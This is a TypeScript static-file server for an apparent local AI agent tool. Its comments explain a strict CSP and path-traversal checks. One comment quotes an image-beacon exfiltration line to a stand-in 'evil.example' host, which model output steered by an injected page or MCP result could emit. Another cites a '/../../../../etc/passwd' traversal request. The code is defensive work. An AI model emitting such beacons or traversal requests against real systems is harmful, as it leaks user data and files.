import { createReadStream } from 'node:fs';
import { readFile, stat } from 'node:fs/promises';
import type { ServerResponse } from 'node:http';
import { extname, join, normalize, resolve, sep } from 'node:path';

const TYPES: Record<string, string> = {
  '.html': 'text/html; charset=utf-8',
  '.js': 'text/javascript; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.svg': 'image/svg+xml',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.webp': 'image/webp',
  '.ico': 'image/x-icon',
  '.woff2': 'font/woff2',
  '.map': 'application/json; charset=utf-8',
};

/**
 * The policy for the shell page — the one holding the socket that runs commands.
 *
 * The threat it answers is a DOMPurify bypass. Model output reaches the page
 * through `dangerouslySetInnerHTML` (markdown.ts), and a sanitizer is one CVE
 * away from letting something through; these directives are what is still true
 * on the day that happens.
 *
 * `img-src` is the one that closes a channel open *today*. DOMPurify permits
 * `<img>` with an arbitrary `src`, so a model — or a fetched page or MCP result
 * steering it — can emit `<img src="https://evil.example/?d=…">` and beacon
 * out. Restricting it to `'self' data: blob:` leaves pasted attachments and
 * rendered content working and kills the beacon.
 *
 * **`script-src` deliberately keeps `'unsafe-inline'`, and tightening it will
 * silently break artifacts.** Measured in Chrome, not assumed: a `srcdoc`
 * iframe — and a `blob:` one — inherits this policy *in addition to* its own,
 * so `script-src 'self'` here stops the inline scripts inside an HTML artifact
 * from running, even though artifactFrame.ts grants them `'unsafe-inline'` and
 * `frame-src` makes no difference. The fix is not a stricter string: it is
 * serving artifact documents from a real HTTP route, which carries its own CSP
 * and does not inherit (also measured). Until that refactor, this directive
 * stays as it is — a broken Preview tab is not worth a backstop for a
 * hypothetical sanitizer bypass.
 */
const SHELL_CSP = [
  "default-src 'self'",
  "script-src 'self' 'unsafe-inline'",
  // Runtime-injected styles: highlight.js themes are static, but mermaid adds
  // its own <style> when it renders.
  "style-src 'self' 'unsafe-inline'",
  // 'self' for the bundle's assets, data: for pasted images and inlined icons,
  // blob: for anything rendered client-side.
  "img-src 'self' data: blob:",
  "font-src 'self' data:",
  // Same-origin only — which covers the WebSocket, since 'self' matches ws://
  // on the same host and port. Nothing here should ever reach the network.
  "connect-src 'self'",
  "frame-src 'self' blob: data:",
  // The shell must never be framed: it holds a live command-execution socket,
  // so clickjacking it is clickjacking a terminal.
  "frame-ancestors 'none'",
  "object-src 'none'",
  "base-uri 'none'",
  "form-action 'none'",
].join('; ');

/**
 * Serve one file from `dir`, falling back to index.html so client-side routes
 * survive a refresh.
 *
 * The path is resolved and then checked to be *inside* `dir` before anything
 * is opened. That check is the whole point of this function existing rather
 * than a two-line `createReadStream(join(dir, url))`: without it,
 * `GET /../../../../etc/passwd` — or any encoded variant, since `decodeURI`
 * runs first — reads whatever the user running the host can read. It is the
 * same jail `run_command` applies to its cwd, for the same reason.
 */
export async function serveStatic(
  dir: string,
  urlPath: string,
  res: ServerResponse,
  /**
   * Launch-time facts stamped onto `<html>` as data-* attributes, for a static
   * SPA that has to know something only the host knows — today, whether the
   * other product is mounted alongside it.
   *
   * Injected here rather than fetched by the page: it is fixed for the life of
   * the process, and a probe would mean the switcher appears a beat after
   * everything else, or flickers when the request is slow.
   */
  rootAttrs?: Record<string, string>,
): Promise<boolean> {
  const root = resolve(dir);

  const candidate = safeJoin(root, urlPath);
  const file = candidate && (await isFile(candidate)) ? candidate : join(root, 'index.html');
  if (!(await isFile(file))) return false;

  // Re-check the final choice: the index.html fallback is inside `root` by
  // construction, but this way one audit covers every path that reaches open().
  if (!isInside(root, file)) return false;

  const type = TYPES[extname(file).toLowerCase()] ?? 'application/octet-stream';
  const html = type.startsWith('text/html');
  res.writeHead(200, {
    'content-type': type,
    // A local tool serving a freshly built bundle: never let a stale asset
    // outlive a rebuild. The bundle is on localhost, so there is nothing to save.
    'cache-control': 'no-store',
    // Defense in depth for the shell page itself; artifact sandboxing (W7)
    // gets its own, much stricter policy.
    'content-security-policy': SHELL_CSP,
    'x-content-type-options': 'nosniff',
    'referrer-policy': 'no-referrer',
  });
  if (html && rootAttrs && Object.keys(rootAttrs).length > 0) {
    // Values are host-controlled, never user input, but escaped anyway: a
    // quote reaching an attribute is how injection starts, and the cost of
    // being sure here is one replace.
    const attrs = Object.entries(rootAttrs)
      .map(([k, v]) => ` data-${k}="${v.replace(/[&<>"]/g, (c) => `&#${c.charCodeAt(0)};`)}"`)
      .join('');
    const source = await readFile(file, 'utf8');
    res.end(source.replace(/<html(?=[\s>])/i, `<html${attrs}`));
    return true;
  }

  createReadStream(file).pipe(res);
  return true;
}

/** Resolves `urlPath` under `root`, or undefined if it escapes. */
function safeJoin(root: string, urlPath: string): string | undefined {
  let decoded: string;
  try {
    decoded = decodeURIComponent(urlPath.split('?')[0] ?? '/');
  } catch {
    return undefined; // malformed percent-encoding
  }
  if (decoded.includes('\0')) return undefined;
  const rel = normalize(decoded).replace(/^(\.\.[/\\])+/, '').replace(/^[/\\]+/, '');
  const full = resolve(root, rel);
  return isInside(root, full) ? full : undefined;
}

function isInside(root: string, candidate: string): boolean {
  return candidate === root || candidate.startsWith(root.endsWith(sep) ? root : root + sep);
}

async function isFile(path: string): Promise<boolean> {
  try {
    return (await stat(path)).isFile();
  } catch {
    return false;
  }
}
